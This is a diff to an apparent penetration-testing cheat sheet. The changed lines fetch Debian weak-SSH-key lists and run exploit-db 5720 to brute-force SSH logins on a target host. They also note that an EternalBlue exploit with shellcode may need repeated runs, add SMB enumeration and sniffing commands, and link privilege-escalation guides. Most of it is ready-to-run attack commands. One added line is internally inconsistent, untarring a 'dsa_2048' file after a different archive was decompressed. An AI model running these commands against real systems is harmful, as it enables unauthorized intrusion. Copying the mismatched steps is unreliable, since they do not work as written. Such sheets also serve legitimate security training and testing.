@@ -283,10 +283,14 @@ All SSL and SSH keys generated on Debian-based systems (Ubuntu, Kubuntu, etc) be
 
 https://www.exploit-db.com/exploits/5720
 
-wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/5622.tar.bz2
-bunzip2 5622.tar.bz2
-tar -xvf 5622.tar
+wget https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_rsa_2048_x86.tar.bz2 https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_dsa_1024_x86.tar.bz2
+
+bunzip2 debian_ssh_rsa_2048_x86.tar.bz2 debian_ssh_dsa_1024_x86.tar.bz2
+tar -xvf debian_ssh_dsa_2048_x86.tar
+tar -xvf debian_ssh_dsa_1024_x86.tar
+
 python 5720 rsa/2048 <IP> <USER> <PORT> <THREADS>
+python 5720 dsa/1024 <IP> <USER> <PORT> <THREADS>
 ```
 
 ------
@@ -626,7 +630,7 @@ Sometimes nmap doesn’t show the version of Samba in the remote host, if this h
 
 OR
 
-sudo ngrep -i -d tun0 's.?a.?m.?b.?a.*[[:digit:]]' port 139
+sudo ngrep -i -d <INTERFACE> 's.?a.?m.?b.?a.*[[:digit:]]' port 139
 smbclient -L <IP>
 ```
 
@@ -646,6 +650,7 @@ crackmapexec smb <IP> -u '' -p '' --shares
 enum4linux -a <IP>
 
 smbclient --no-pass -L //$IP
+smbclient //<IP>/<SHARE>
 
 nmap --script "safe or smb-enum-*" -p 445 <IP>
 ```
@@ -709,6 +714,8 @@ cd ..
 
 ```
 python eternalblue_exploit<NUMBER>.py <IP> shellcode/sc_all.bin
+
+May need to run it multiple times
 ```
 
 ### If this doesn't work, try this one
@@ -1352,6 +1359,7 @@ https://gtfobins.github.io/
 
 ```
 https://guif.re/linuxeop
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
 ```
 
 ```
@@ -1432,6 +1440,7 @@ https://guif.re/windowseop
 https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
 https://mysecurityjournal.blogspot.com/p/client-side-attacks.html
 http://www.fuzzysecurity.com/tutorials/16.html
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
 ```
 
 ### Autorun
@@ -1936,6 +1945,9 @@ powershell -nop -ep bypass
 
 # List hidden files
 dir /a
+
+# Find a file
+dir /b/s "<FILE>"
 ```
 
 ------
